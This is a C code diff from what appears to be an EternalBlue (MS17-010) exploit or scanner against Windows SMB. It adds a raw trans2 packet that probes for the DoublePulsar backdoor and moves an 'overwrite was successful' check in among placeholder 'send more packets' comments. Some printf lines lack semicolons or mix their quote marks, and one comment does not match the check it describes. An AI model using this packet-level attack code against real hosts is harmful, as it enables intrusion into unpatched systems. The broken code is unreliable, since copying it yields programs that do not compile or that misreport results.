@@ -35,12 +35,22 @@ unsigned char treeConnectRequest[] =
 "\x38\x00\x2e\x00\x31\x00\x37\x00\x35\x00\x2e\x00\x31\x00\x32\x00"
 "\x38\x00\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f\x00";
 
+//checks for the MS17-010 vulnerability
 unsigned char transNamedPipeRequest[] = 
 "\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x8e\xa3\x01\x08"
 "\x52\x98\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00"
 "\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00";
+
+//checks if DoublePulsar is present
+unsigned char trans2_session_setup[] =
+"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
+"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
+"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00";
 
 unsigned char recvbuff[2048];
 
@@ -130,6 +140,13 @@ int main(int argc, char** argv)
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
+    
+    //compare the NT_STATUS response to 0xC000000D ( STATUS_INVALID_PARAMETER)
+    if (recvbuff[9] == 0x0D && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+    {
+        printf("EternalBlue overwrite was successful\n");
+    }
+    
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
@@ -138,12 +155,31 @@ int main(int argc, char** argv)
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
 
-    //compare the NT_STATUS response to 0xC000000D ( STATUS_INVALID_PARAMETER)
-    if (recvbuff[9] == 0x0D && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+    //Replace tree ID and user ID in trans2 session setup packet
+    memcpy(trans2_session_setup + 0x20, (char*)&userid, 2);  //update userid
+    memcpy(trans2_session_setup + 0x1c, (char*)&treeid, 2);  //update treeid
+
+    //send modified trans2 session request
+    ret = send(sock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
+    if (ret <= 0)
     {
-        printf("EternalBlue overwrite was successful\n");
+        return 0;
     }
-    
+    recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+
+    //if multiplex id = x51 or 81 then DoublePulsar is present
+    if (recvbuff[34] == 0x51)
+    {
+        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+        printf('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+    }
+    else 
+    {
+        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+    }
     //cleanup
     closesocket(sock);
     WSACleanup();
